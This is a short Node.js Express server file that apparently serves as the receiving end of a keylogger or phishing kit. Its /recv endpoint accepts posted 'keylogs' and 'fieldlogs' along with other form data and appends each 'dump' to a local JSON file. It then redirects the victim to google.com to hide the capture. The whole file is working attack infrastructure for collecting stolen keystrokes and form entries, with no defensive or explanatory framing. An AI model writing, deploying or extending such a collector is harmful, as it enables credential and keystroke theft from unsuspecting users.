import express from 'express'
import cors from 'cors'
import fs from 'node:fs'

const app = express()
app.use(cors())
app.use(express.urlencoded({ extended: true }))

const db = './db.json'

function loadDb() {
  if (fs.existsSync(db)) {
    return
  }

  const emptyDb = {
    dumps: [],
  }

  fs.writeFileSync(db, JSON.stringify(emptyDb, null, 2))
}

app.post('/recv', (req, res) => {
  const data = JSON.parse(fs.readFileSync(db).toString())

  function nonWs(data) {
    return data.replaceAll(' ', 'WHITESPACE')
  }

  const keylogs = JSON.parse(nonWs(req.body.LOGGER.keylogs))
  const fieldlogs = JSON.parse(nonWs(req.body.LOGGER.fieldlogs))
  delete req.body.LOGGER

  data.dumps.push({ ...req.body, LOGGER: { keylogs, fieldlogs } })
  fs.writeFileSync(db, JSON.stringify(data, null, 2))

  console.log(`- Dump ${data.dumps.length}`)
  res.redirect('https://google.com')
})

app.listen(80, () => {
  loadDb()
  console.log('Listen...')
})
